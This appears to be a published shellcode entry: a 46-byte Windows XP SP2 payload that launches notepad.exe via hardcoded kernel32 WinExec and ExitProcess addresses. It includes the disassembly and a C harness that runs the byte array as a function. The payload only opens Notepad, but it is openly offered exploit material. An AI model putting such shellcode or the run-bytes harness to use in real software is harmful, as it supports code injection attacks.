/*
#[+] Author: e55db081d05f58a
#[+] Title: Shellcode: win32/xp sp2 notepad.exe 46 bytes
#[+] Type:Shellcode
#[+] Tested on: WinXp 32bit SP2
#[+] Twitter: @e55db081d05f58a
=====================================================

=====================================================
Disassembly of section .text:

00401000 <.text>:
  401000:       31 c0                   xor    %eax,%eax
  401002:       31 d2                   xor    %edx,%edx
  401004:       52                      push   %edx
  401005:       b0 65                   mov    $0x65,%al
  401007:       66 50                   push   %ax
  401009:       66 b8 65 78             mov    $0x7865,%ax
  40100d:       66 50                   push   %ax
  40100f:       68 70 61 64 2e          push   $0x2e646170
  401014:       68 6e 6f 74 65          push   $0x65746f6e
  401019:       89 e0                   mov    %esp,%eax
  40101b:       6a 01                   push   $0x1
  40101d:       50                      push   %eax
  40101e:       bb 4d 11 86 7c          mov    $0x7c86114d,%ebx << mov ebx,kernel32.WinExec
  401023:       ff d3                   call   *%ebx
  401025:       6a 01                   push   $0x1
  401027:       bb a2 ca 81 7c          mov    $0x7c81caa2,%ebx << mov ebx,kernel32.ExitProcess
  40102c:       ff d3                   call   *%ebx
  */
#include <stdio.h>
#include <string.h>
int main(int argc,char **argv){
    char shellcode[]="\x31\xc0\x31\xd2"
                     "\x52"
                     "\xb0\x65"
                     "\x66\x50"
                     "\x66\xb8\x65\x78"
                     "\x66\x50"
                     "\x68\x70\x61\x64\x2e"
                     "\x68\x6e\x6f\x74\x65"
                     "\x89\xe0"
                     "\x6a\x01"
                     "\x50"
                     "\xbb\x4d\x11\x86\x7c"
                     "\xff\xd3"
                     "\x6a\x01"
                     "\xbb\xa2\xca\x81\x7c"
                     "\xff\xd3";
        int(*f)();
        f=(int(*)())shellcode;
        printf("Length: %d\n",strlen(shellcode));
        (int)(*f)();
    return 0;
}
